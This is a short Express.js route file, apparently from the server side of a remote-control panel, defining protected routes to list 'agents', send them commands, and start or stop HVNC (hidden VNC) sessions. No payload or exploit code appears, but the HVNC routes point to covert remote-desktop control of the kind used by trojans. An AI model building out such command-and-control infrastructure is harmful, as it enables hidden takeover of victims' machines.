const express = require('express');
const agentController = require('../controllers/agent.controller');
const { protect } = require('../middleware/security');

const router = express.Router();

// Protect all routes
router.use(protect);

// Agent management routes
router.get('/', agentController.getAllAgents);
router.get('/:id', agentController.getAgent);
router.post('/:id/command', agentController.sendCommand);

// HVNC specific routes
router.post('/:id/hvnc/start', agentController.startHvncSession);
router.post('/:id/hvnc/stop', agentController.stopHvncSession);

module.exports = router;